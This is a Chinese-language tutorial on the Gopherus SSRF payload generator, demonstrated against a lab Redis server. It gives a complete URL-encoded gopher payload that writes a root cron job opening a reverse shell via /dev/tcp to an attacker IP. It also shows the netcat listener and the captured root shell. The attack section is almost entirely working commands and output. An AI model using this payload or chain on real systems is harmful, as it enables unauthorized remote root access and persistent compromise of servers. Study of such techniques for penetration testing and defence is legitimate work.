在 SSRF 漏洞用于生成 Gopher Payload 的工具。

## 1 安装

下载

```shell
┌──(root㉿kali)-[~]
└─# git clone https://github.com/tarunkant/Gopherus.git /root/tools/gopherus && sudo sed -i 's/python2/python3/g' /root/tools/gopherus/install.sh
```

安装

```shell
┌──(root㉿kali)-[~]
└─# cd /root/tools/gopherus/ && bash install.sh && cd
```

## 2 使用

查看帮助

```shell
┌──(root㉿kali)-[~]
└─# gopherus -h
```

## 3 实战

**`redis`** 

安装 `redis` 并运行

```shell
[root@centos ~]# sudo yum install -y redis && sudo redis-server
```

攻击 `redis` 

```shell
┌──(root㉿kali)-[~]
└─# gopherus --exploit redis
```

选择反弹 `shell` 

```
What do you want?? (ReverseShell/PHPShell): ReverseShell
```

填写接收地址

```
Give your IP Address to connect with victim through Revershell (default is 127.0.0.1): 192.168.1.30
```

直接回车忽略

```
## For debugging(locally) you can use /var/lib/redis :
```

侦听端口

```shell
┌──(root㉿kali)-[~]
└─# nc -lvp 1234
```

发送 `url` 

```shell
[root@centos ~]# curl gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2467%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/192.168.1.30/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

一分钟后接收到 `shell` 

```shell
┌──(root㉿kali)-[~]
└─# nc -lvp 1234
listening on [any] 1234 ...
connect to [192.168.1.30] from test.local [192.168.1.50] 33366
sh: 此 shell 中无任务控制
sh-4.2#
```

查看计划任务

```shell
[root@centos ~]# cat /var/spool/cron/root
```

```
*/1 * * * * bash -c "sh -i >& /dev/tcp/192.168.1.30/1234 0>&1"
```

---

参考链接

- [Gopherus](https://github.com/tarunkant/Gopherus)
